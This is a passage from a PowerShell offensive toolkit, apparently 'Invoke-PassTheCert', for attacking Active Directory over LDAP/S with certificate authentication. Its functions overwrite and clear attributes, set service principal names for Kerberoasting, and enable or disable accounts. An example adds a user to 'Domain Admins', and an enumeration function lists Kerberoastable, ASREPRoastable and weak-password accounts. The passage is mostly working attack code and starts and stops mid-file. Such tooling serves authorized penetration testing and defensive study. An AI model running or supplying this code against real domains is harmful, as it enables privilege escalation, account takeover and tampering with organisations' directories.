            The new value to set on the specified attribute (e.g. `!D3$cR1Pt4t0R!`).

        .EXAMPLE

            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']

            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.

        .EXAMPLE

            _OverwriteValueInAttribute -LdapConnection $LdapConnection -IdentityDN 'CN=John JD. DOE,CN=Users,DC=X' -Attribute 'description' -Value '!D3$cR1Pt4t0R!'

            Overwrites the value of attribute `description` of object `John JD. DOE` to `!D3$cR1Pt4t0R!`

        .EXAMPLE

            _OverwriteValueInAttribute -LdapConnection $LdapConnection -IdentityDN 'CN=John JD. DOE,CN=Users,DC=X' -Attribute 'serviceprincipalname' -Value 'TERMSRV/SRV01'

            Overwrites the whole content of attribute `serviceprincipalname` of object `John JD. DOE` to `TERMSRV/SRV01`. Being a multi-valued attribute, if `serviceprincipalname` was set to `[CIFS/SRV01, LDAP/SRV01, HTTP/SRV01]`, then this would leave it to `[TERMSRV/SRV01]` only.

        .EXAMPLE

            _OverwriteValueInAttribute -LdapConnection $LdapConnection -IdentityDN 'CN=John JD. DOE,CN=Users,DC=X' -Attribute 'displayName' -Value 'My Name Is... "D''oh!!" !!'

            Overwrites the value of attribute `displayName` of object `John JD. DOE` to `My Name Is... "D'oh!!" !!`.

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.ldapconnection
        
        .LINK 
        
            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.modifyrequest

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance")]
        [ValidateNotNullorEmpty()]
        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,

        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the identity of the targeted object whose attribute's value must be overwritten")]
        [System.String]$IdentityDN,

        [Parameter(Position=2, Mandatory=$true, HelpMessage="Enter the attribute of the targeted object")]
        [System.String]$Attribute,

        [Parameter(Position=3, Mandatory=$true, HelpMessage="Enter the new value")]
        [System.String]$Value
    )

    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters

    Write-Verbose "[*] Overwritting Value Of '$IdentityDN':'$Attribute' To '$Value'..."

    $LdapConnection.SendRequest(
        (New-Object System.DirectoryServices.Protocols.ModifyRequest(
            $IdentityDN,
            [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace, 
            $Attribute,
            $Value
        ))
    ) |Out-Null

    Write-Host "[+] Successfully Overwritten Value Of '$IdentityDN':'$Attribute' To '$Value' !"
    Write-Host "[*] [Check] Invoke-PassTheCert -Action 'Filter' -LdapConnection `$LdapConnection -SearchBase '$IdentityDN' -SearchScope Base -Properties '$Attribute' |fl"
    return
}


function _AddValueInAttribute {
    
    <#

        .SYNOPSIS

            Adds a specified value to an existing attribute on a targeted object.

            - The attribute's value must be undefined, or empty. Otherwise, the attribute must be multi-valued (e.g. `serviceprincipalname`).

        .PARAMETER LdapConnection

            [System.DirectoryServices.Protocols.LdapConnection] 
            
            The established LDAP Connection Instance.

        .PARAMETER IdentityDN

            [System.String] 
            
            The identity of the targeted object whose attribute's value must be added

        .PARAMETER Attribute

            [System.String] 
            
            The attribute of the targeted object

        .PARAMETER Value

            [System.String] 
            
            The value to add into the specified attribute

        .EXAMPLE

            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']

            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.

        .EXAMPLE

            _AddValueInAttribute -LdapConnection $LdapConnection -IdentityDN 'CN=J0hn JR. RIPP3R,CN=Users,DC=X' -Attribute 'description' -Value '%Hacked By @!xX_C3rT1fi3d_Xx!%'

            Sets the value `%Hacked By @!xX_C3rT1fi3d_Xx!%` to attribute `description` of object `J0hn JR. RIPP3R` (if the attribute's value was undefined, or empty).

        .EXAMPLE

            _AddValueInAttribute -LdapConnection $LdapConnection -IdentityDN 'CN=John JD. DOE,CN=Users,DC=X' -Attribute 'displayName' -Value 'My Name Is... "D''oh!!" !!'

            Sets the value `My Name Is... "D'oh!!" !!` to attribute `displayName` of object `John JD. DOE` (if the attribute's value was undefined, or empty).

        .EXAMPLE

            _AddValueInAttribute -LdapConnection $LdapConnection -IdentityDN 'CN=Ash AC. C4T,CN=Users,DC=X' -Attribute 'serviceprincipalname' -Value 'CIFS/SRV01'

            Adds the value `HTTP/GETH4HSH` from the attribute `serviceprincipalname` of object `Ash AC. C4T`. Being a multi-valued attribute, if `serviceprincipalname` was set to `[CIFS/SRV01, LDAP/SRV01]`, then this would leave it to `[CIFS/SRV01, LDAP/SRV01], HTTP/GETH4HSH]`

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.ldapconnection
        
        .LINK 
        
            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.modifyrequest

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance")]
        [ValidateNotNullorEmpty()]
        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,

        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the identity of the targeted object whose attribute's value must be added")]
        [System.String]$IdentityDN,

        [Parameter(Position=2, Mandatory=$true, HelpMessage="Enter the attribute of the targeted object")]
        [System.String]$Attribute,

        [Parameter(Position=3, Mandatory=$true, HelpMessage="Enter the value to be added")]
        [System.String]$Value
    )

    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters

    Write-Verbose "[*] Adding Value '$Value' In Attribute '$IdentityDN':'$Attribute'..."

    $LdapConnection.SendRequest(
        (New-Object System.DirectoryServices.Protocols.ModifyRequest(
            $IdentityDN, 
            [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Add, 
            $Attribute, 
            $Value
        ))
    ) |Out-Null

    Write-Host "[+] Successfully Added Value '$Value' In Attribute '$IdentityDN':'$Attribute' !"
    Write-Host "[*] [Check] Invoke-PassTheCert -Action 'Filter' -LdapConnection `$LdapConnection -SearchBase '$IdentityDN' -SearchScope Base -Properties '$Attribute' |fl"
    Write-Host "[*] [Remove] Invoke-PassTheCert -Action 'RemoveValueInAttribute' -LdapConnection `$LdapConnection -Identity '$IdentityDN' -Attribute '$Attribute' -Value '$Value'"

    return
}


function _RemoveValueInAttribute {
    
    <#

        .SYNOPSIS

            Removes a specified value from an existing attribute on a targeted object.

            - The attribute must have been set to (or contain, if the attribute is multi-valued, e.g. `serviceprincipalname`) the specified value.

        .PARAMETER LdapConnection

            [System.DirectoryServices.Protocols.LdapConnection] 
            
            The established LDAP Connection Instance.

        .PARAMETER IdentityDN

            [System.String] 
            
            The identity of the targeted object whose attribute's value must be removed.

        .PARAMETER Attribute

            [System.String] 
            
            The attribute of the targeted object

        .PARAMETER Value

            [System.String] 
            
            The value to remove from the specified attribute

        .EXAMPLE

            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']

            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.

        .EXAMPLE

            _RemoveValueInAttribute -LdapConnection $LdapConnection -IdentityDN 'CN=Kobalt KS. STRIKE,CN=Users,DC=X' -Attribute 'description' -Value 'Cat&Ctrl'

            Removes the value `Cat&Ctrl` of attribute `description` of object `Kobalt KS. STRIKE`, only if the attribute's value was already set to `Cat&Ctrl`. Being a single-valued attribute, then this would leave it empty.

        .EXAMPLE

            _RemoveValueInAttribute -LdapConnection $LdapConnection -IdentityDN 'CN=Shelled SE. EMPIRE,CN=Users,DC=X' -Attribute 'serviceprincipalname' -Value 'CIFS/LEGIT'

            Removes the value `CIFS/LEGIT` from the attribute `serviceprincipalname` of object `Shelled SE. EMPIRE`, only if one of the attribute's value(s) was already set to `CIFS/LEGIT`. Being a multi-valued attribute, if `serviceprincipalname` was set to `[CIFS/LEGIT, LDAP/SRV01]`, then this would leave it to `[LDAP/SRV01]`

        .EXAMPLE

            _RemoveValueInAttribute -LdapConnection $LdapConnection -IdentityDN 'CN=Met AS. SPLOYT,CN=Users,DC=X' -Attribute 'displayName' -Value 'Sp10ytin'Th3m4LL!'

            Removes the value `Sp10ytin'Th3m4LL!` of attribute `displayName` of object `Met AS. SPLOYT`, only if the attribute's value was already set to `Sp10ytin'Th3m4LL!`. Being a single-valued attribute, then this would leave it empty.

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.ldapconnection
        
        .LINK 
        
            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.deleterequest

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance")]
        [ValidateNotNullorEmpty()]
        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,

        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the identity of the targeted object whose attribute's value must be removed")]
        [System.String]$IdentityDN,

        [Parameter(Position=2, Mandatory=$true, HelpMessage="Enter the attribute of the targeted object")]
        [System.String]$Attribute,

        [Parameter(Position=3, Mandatory=$true, HelpMessage="Enter the value to be removed")]
        [System.String]$Value
    )

    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters

    Write-Verbose "[*] Removing Value '$Value' In Attribute '$IdentityDN':'$Attribute'..."

    $LdapConnection.SendRequest(
        (New-Object System.DirectoryServices.Protocols.ModifyRequest(
            $IdentityDN, 
            [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete, 
            $Attribute,
            $Value
        ))
    ) |Out-Null

    Write-Host "[+] Successfully Removed Value '$Value' In Attribute '$IdentityDN':'$Attribute' !"
    Write-Host "[*] [Check] Invoke-PassTheCert -Action 'Filter' -LdapConnection `$LdapConnection -SearchBase '$IdentityDN' -SearchScope Base -Properties '$Attribute' |fl"
    return
}


function _ClearAttribute {
    
    <#

        .SYNOPSIS

            Clears the value(s) of a specified attribute on a targeted object.

            - The attribute MUST exist (i.e. filled with at least one non-empty value).
            
        .PARAMETER LdapConnection

            [System.DirectoryServices.Protocols.LdapConnection] 
            
            The established LDAP Connection Instance.

        .PARAMETER IdentityDN

            [System.String] 
            
            The identity of the targeted object

        .PARAMETER Attribute

            [System.String] 
            
            The attribute of the targeted object to clear

        .EXAMPLE

            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']

            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.

        .EXAMPLE

            _ClearAttribute -LdapConnection $LdapConnection -IdentityDN 'CN=Ima IA. APPLY,CN=Users,DC=X' -Attribute 'description'

            Clears the value stored into the `description` of the object `Ima IA. APPLY`, only if the attribute contained a value.

        .EXAMPLE

            _ClearAttribute -LdapConnection $LdapConnection -IdentityDN 'CN=Ima IA. APPLY,CN=Users,DC=X' -Attribute 'serviceprincipalname'

            Clears the value(s) stored into the `serviceprincipaname` of the object `Ima IA. APPLY`, only if the attribute contained at least one value. For instance, if the attribute was set to `[CIFS/SRV01, LDAP/SRV01, HTTP/SRV01]`, then this would leave it empty.

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.ldapconnection

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.modifyrequest
        
        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.directoryattributemodification

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance")]
        [ValidateNotNullorEmpty()]
        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,

        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the identity of the targeted object whose attribute's value must be deleted")]
        [System.String]$IdentityDN,

        [Parameter(Position=2, Mandatory=$true, HelpMessage="Enter the attribute of the targeted object")]
        [System.String]$Attribute
    )

    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters

    Write-Verbose "[*] Clearing Attribute '$IdentityDN':'$Attribute'..."

    $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
    $Modification.Name = $Attribute
    $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete
    
    $LdapConnection.SendRequest(
        (New-Object System.DirectoryServices.Protocols.ModifyRequest(
            $IdentityDN,
            $Modification
        ))
    ) |Out-Null
    
    Write-Host "[+] Successfully Cleared Attribute '$IdentityDN':'$Attribute' !"
    Write-Host "[*] [Check] Invoke-PassTheCert -Action 'Filter' -LdapConnection `$LdapConnection -SearchBase '$IdentityDN' -SearchScope Base -Properties '$Attribute' |fl"
    return
}


function _ShowStatusOfAccount {
    
    <#

        .SYNOPSIS

            Returns the text of the specified account's status (i.e. 'Enabled', or 'Disabled').

        .PARAMETER LdapConnection

            [System.DirectoryServices.Protocols.LdapConnection] 
            
            The established LDAP Connection Instance.

        .PARAMETER IdentityDN

            [System.String] 
            
            The identity of the targeted account whose status must be shown.

        .EXAMPLE

            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']

            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.

        .EXAMPLE

            _ShowStatusOfAccount -LdapConnection $LdapConnection -IdentityDN 'CN=Ima IN. NBELD,CN=Users,DC=X'

            Shows Enabled if the account `Ima IN. NBELD` is enabled, Disabled otherwise.

        .OUTPUTS

            [System.String] 
            
            The text of the specified account's status (i.e. 'Enabled', or 'Disabled').

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.ldapconnection

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.searchrequest

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance")]
        [ValidateNotNullorEmpty()]
        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,

        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the identity of the targeted account whose status must be checked")]
        [System.String]$IdentityDN
    )
    
    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters

    Write-Verbose "[*] Checking Status Of Account '$IdentityDN'..."

    $SearchResponse = $LdapConnection.SendRequest(
        (New-Object System.DirectoryServices.Protocols.SearchRequest(
            $IdentityDN, 
            '(objectClass=person)', 
            [System.DirectoryServices.SearchScope]::Base
        ))
    )

    if ($SearchResponse.Entries.Count -eq 0) {
        return "[!] Account '$IdentityDN' Not Found (Either Inexistent, Or Not Of Class 'person') !"
    } else {
        [System.Int32]$UAC = [System.Int32]($SearchResponse.Entries[0].Attributes["userAccountControl"][0].ToString())
        [System.Int32]$AccountDisabled = 0x0002;
        
        if (($UAC -band $AccountDisabled) -gt 0) {
            return "[*] Account '$IdentityDN' Is Disabled.";
        } else {
            return "[*] Account '$IdentityDN' Is Enabled.";
        }
    }
}


function _EnableAccount {
    
    <#

        .SYNOPSIS

            Enables a specified account.

        .PARAMETER LdapConnection

            [System.DirectoryServices.Protocols.LdapConnection] 
            
            The established LDAP Connection Instance.

        .PARAMETER IdentityDN

            [System.String] 
            
            The identity of the targeted account whose status must be enabled.

        .EXAMPLE

            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']

            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.

        .EXAMPLE

            _EnableAccount -LdapConnection $LdapConnection -IdentityDN 'CN=Dleb DA. AMI,CN=Users,DC=X'

            Enables the account `Dleb DA. AMI`.

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.ldapconnection

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.modifyrequest

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance")]
        [ValidateNotNullorEmpty()]
        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,

        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the identity of the account to enable")]
        [System.String]$IdentityDN
    )
    
    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters

    Write-Verbose "[*] Enabling Account '$IdentityDN'..."

    $SearchResponse = $LdapConnection.SendRequest(
        (New-Object System.DirectoryServices.Protocols.SearchRequest(
            $IdentityDN, 
            '(objectClass=person)', 
            [System.DirectoryServices.SearchScope]::Base
        ))
    )

    if ($SearchResponse.Entries.Count -eq 0) {
        return "[!] Account '$IdentityDN' Not Found :( (Either Inexistent, Or Not Of Class 'person') !"
    } else {
        [System.Int32]$UAC = [System.Int32]($SearchResponse.Entries[0].Attributes["userAccountControl"][0].ToString())
        [System.Int32]$AccountDisabled = 0x0002;

        # If the account is disabled, 
        if (($UAC -band $AccountDisabled) -gt 0) {
            # Enable it (i.e. bitwise AND with NOT flag)
            $UAC = $UAC -band (-bnot $AccountDisabled)
            $LdapConnection.SendRequest(
                (New-Object System.DirectoryServices.Protocols.ModifyRequest(
                    $IdentityDN, 
                    [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace, 
                    "userAccountControl", 
                    $UAC.ToString()
                ))
            ) |Out-Null

            Write-Host "[+] Successfully Enabled Account '$IdentityDN' !"
            return
        }
        else {
            Write-Host "[!] Account '$IdentityDN' Is Already Enabled !"
            return
        }
    }
}


function _DisableAccount {
    
    <#

        .SYNOPSIS

            Disables a specified account.

        .PARAMETER LdapConnection

            [System.DirectoryServices.Protocols.LdapConnection] 
            
            The established LDAP Connection Instance.

        .PARAMETER IdentityDN

            [System.String] 
            
            The identity of the targeted account whose status must be disabled.

        .EXAMPLE

            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']

            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.

        .EXAMPLE

            _DisableAccount -LdapConnection $LdapConnection -IdentityDN 'CN=Ima IN. BELD,CN=Users,DC=X'

            Disables the account `Ima IN. BELD`.

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.ldapconnection

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.modifyrequest

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance")]
        [ValidateNotNullorEmpty()]
        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,

        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the identity of the account to disable")]
        [System.String]$IdentityDN
    )
    
    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters

    Write-Verbose "[*] Disabling Account '$IdentityDN'..."

    $SearchResponse = $LdapConnection.SendRequest(
        (New-Object System.DirectoryServices.Protocols.SearchRequest(
            $IdentityDN, 
            '(objectClass=person)', 
            [System.DirectoryServices.SearchScope]::Base
        ))
    )


    if ($SearchResponse.Entries.Count -eq 0) {
        Write-Host "[!] Account '$IdentityDN' Not Found :( (Either Inexistent, Or Not Of Class 'person') !"
        return
    } else {
        [System.Int32]$UAC = [System.Int32]($SearchResponse.Entries[0].Attributes["userAccountControl"][0].ToString())
        [System.Int32]$AccountDisabled = 0x0002;

        # If the account is enabled
        if (-not (($UAC -band $AccountDisabled) -gt 0)) {
            # Disable it (i.e. bitwise OR with FLAG)
            $UAC = $UAC -bor $AccountDisabled
            $LdapConnection.SendRequest(
                (New-Object System.DirectoryServices.Protocols.ModifyRequest(
                    $IdentityDN, 
                    [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace, 
                    "userAccountControl", 
                    $UAC.ToString()
                ))
            ) |Out-Null
            
            Write-Host "[+] Successfully Disabled Account '$IdentityDN' !"
            return
        }
        else {
            Write-Host "[!] Account '$IdentityDN' Is Already Disabled !"
            return
        }
    }
}


function _AddGroupMember {
    
    <#

        .SYNOPSIS

            Adds a member to a group.

            - The group MUST NOT already contain the specified member.

        .PARAMETER LdapConnection

            [System.DirectoryServices.Protocols.LdapConnection] 
            
            The established LDAP Connection Instance.

        .PARAMETER IdentityDN

            [System.String] 
            
            The identity of the object to add into the group's members.

        .PARAMETER GroupDN

            [System.String] 
            
            The identity of the group in which a member must be added.

        .EXAMPLE

            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']

            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.

        .EXAMPLE

            _AddGroupMember -LdapConnection $LdapConnection -IdentityDN 'CN=Kinda KU. USY,CN=Users,DC=X' -GroupDN 'CN=Domain Admins,CN=Users,DC=X'

            Adds the member `Kinda KU. USY` into the group `Domain Admins`

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.ldapconnection

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.modifyrequest

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance")]
        [ValidateNotNullorEmpty()]
        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,

        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the identity of the member to add")]
        [System.String]$IdentityDN,

        [Parameter(Position=2, Mandatory=$true, HelpMessage="Enter the distinguished name of the group")]
        [System.String]$GroupDN
    )
    
    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters

    Write-Verbose "[*] Adding Member '$IdentityDN' To Group '$GroupDN'..."

    $LdapConnection.SendRequest(
        (New-Object System.DirectoryServices.Protocols.ModifyRequest(
            $GroupDN, 
            [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Add, 
            "member", 
            $IdentityDN
        ))
    ) |Out-Null

    Write-Host "[+] Successfully Added Member '$IdentityDN' To Group '$GroupDN' !"
    Write-Host "[*] [Remove] Invoke-PassTheCert -Action 'RemoveGroupMember' -LdapConnection `$LdapConnection -Identity '$IdentityDN' -GroupDN '$GroupDN'"

    return
}


function _RemoveGroupMember {
    
    <#

        .SYNOPSIS

            Removes a member from a group.

            - The group MUST already contain the specified member.

        .PARAMETER LdapConnection

            [System.DirectoryServices.Protocols.LdapConnection] 
            
            The established LDAP Connection Instance.

        .PARAMETER IdentityDN

            [System.String] 
            
            The identity of the object to remove from the group's members.

        .PARAMETER GroupDN

            [System.String] 
            
            The identity of the group in which a member must be removed.

        .EXAMPLE

            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']

            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.

        .EXAMPLE

            _RemoveGroupMember -LdapConnection $LdapConnection -IdentityDN 'CN=Kinda KU. USY,CN=Users,DC=X' -GroupDN 'CN=KindaGroupy,CN=Builtin,DC=X'

            Removes the member `Kinda KU. USY` from the group `KindaGroupy`

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.ldapconnection

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.modifyrequest

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance")]
        [ValidateNotNullorEmpty()]
        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,

        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the identity of the member to remove")]
        [System.String]$IdentityDN,

        [Parameter(Position=2, Mandatory=$true, HelpMessage="Enter the distinguished name of the group")]
        [System.String]$GroupDN
    )
    
    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters

    Write-Verbose "[*] Removing Member '$IdentityDN' From Group '$GroupDN'..."

    $LdapConnection.SendRequest(
        (New-Object System.DirectoryServices.Protocols.ModifyRequest(
            $GroupDN, 
            [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete, 
            "member", 
            $IdentityDN
        ))
    ) |Out-Null

    Write-Host "[+] Successfully Removed Member '$IdentityDN' From Group '$GroupDN' !"
    Write-Host "[*] [Add] Invoke-PassTheCert -Action 'AddGroupMember' -LdapConnection `$LdapConnection -Identity '$IdentityDN' -GroupDN '$GroupDN'"
    return
}


function _LDAPEnum {
    
    <#

        .SYNOPSIS

            Invoke-PassTheCert wrapper for LDAP enumerations.

        .PARAMETER LdapConnection

            [System.DirectoryServices.Protocols.LdapConnection] 
            
            The established LDAP Connection Instance.

        .PARAMETER Enum 

            AD Enumeration to be performed (e.g. `Kerberoasting`) (Mandatory)

        .PARAMETER SearchBase
        
            The Distinguished Name of the Seach Base of the LDAP lookup

            - If not specified, defaults to the LDAP/S Server's domain, taken from the provided LDAP Connection Instance.

        .PARAMETER SearchScope 

            The Seach Base of the LDAP lookup (accepted values: 'Base', 'OneLevel', 'Subtree')

            - If not specified, defaults to Subtree (or `Base`, for RootDSE enumeration)
        
        .EXAMPLE

            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']

            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.

        .EXAMPLE

            _LDAPEnum -LdapConnection $LdapConnection -Enum 'Kerberoasting' -SearchBase 'DC=X' |fl

            Returns all kerberoastable accounts (krbtgt excluded) in the domain `X` (or, if not specified, in the LDAP/S Server's Domain)

            - `|fl` allows to print the multi-valued 'serviceprincipalename' attribute conveniently (no more "...").

        .EXAMPLE

            _LDAPEnum -LdapConnection $LdapConnection -Enum 'ASREPRoasting'

            Returns all ASREPRoastable accounts (i.e. with UAC Flag DONT_REQ_PREAUTH) in the LDAP/S Server's Domain (default SearchBase)

        .EXAMPLE

            _LDAPEnum -LdapConnection $LdapConnection -Enum 'Descriptions'

            Returns all non-empty descriptions of accounts in the LDAP/S Server's Domain (default SearchBase)

        .EXAMPLE

            _LDAPEnum -LdapConnection $LdapConnection -Enum 'Users'

            Returns all users in the LDAP/S Server's Domain (default SearchBase)

        .EXAMPLE

            _LDAPEnum -LdapConnection $LdapConnection -Enum 'Computers'

            Returns all computers in the LDAP/S Server's Domain (default SearchBase)

        .EXAMPLE

            _LDAPEnum -LdapConnection $LdapConnection -Enum 'Groups'

            Returns all groups in the LDAP/S Server's Domain (default SearchBase)

        .EXAMPLE

            _LDAPEnum -LdapConnection $LdapConnection -Enum 'DCs'

            Returns all Domain Controllers in the LDAP/S Server's Domain (default SearchBase)

        .EXAMPLE

            _LDAPEnum -LdapConnection $LdapConnection -Enum 'OUs'

            Returns all Organizational Units in the LDAP/S Server's Domain (default SearchBase)

        .EXAMPLE

            _LDAPEnum -LdapConnection $LdapConnection -Enum 'Sites'

            Returns all Sites in the LDAP/S Server's Domain (default SearchBase)

        .EXAMPLE

            _LDAPEnum -LdapConnection $LdapConnection -Enum 'GPOs'

            Returns all GPOs in the LDAP/S Server's Domain (default SearchBase)

        .EXAMPLE

            _LDAPEnum -LdapConnection $LdapConnection -Enum 'GPLinks'

            Returns all GPLinks in the LDAP/S Server's Domain (default SearchBase)

        .EXAMPLE

            _LDAPEnum -LdapConnection $LdapConnection -Enum 'Printers'

            Returns all Printers in the LDAP/S Server's Domain (default SearchBase)

        .EXAMPLE

            _LDAPEnum -LdapConnection $LdapConnection -Enum 'DONT_EXPIRE_PASSWORD'

            Returns all accounts with the `DONT_EXPIRE_PASSWORD` UAC Flag in the LDAP/S Server's Domain (default SearchBase)

        .EXAMPLE

            _LDAPEnum -LdapConnection $LdapConnection -Enum 'PASSWD_NOTREQD'

